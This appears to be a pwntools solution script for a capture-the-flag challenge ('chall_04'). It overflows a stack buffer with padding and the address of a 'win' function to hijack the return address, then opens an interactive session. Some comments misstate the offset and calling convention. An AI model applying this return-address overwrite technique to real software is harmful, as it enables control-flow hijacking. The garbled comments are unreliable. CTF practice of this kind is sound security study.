#Challenge 4 - we are calling vuln from our main, and we have a win function.
#Not bad, just get our payload to the correct spot, and fill it with junk, until it gets to the correct address to return
#to, then we add our p64(function location) to jump there.


from pwn import *

p = process ("./chall_04")
context.arch = "amd64" 
p.recv()
payload = b''
#now we want to go to our base pointer - our location + the p(64) of where wwe want to jump
payload+= (0x40 + 0x8 - 0x10) * b'A' #we use 0x60 because this is the argument that's passed into RDI [calling convention]
elf = ELF("./chall_04") #used to call the methods in system
payload += p64(elf.sym.win)
p.sendline("junk")
p.sendline(payload)
p.interactive()
ls

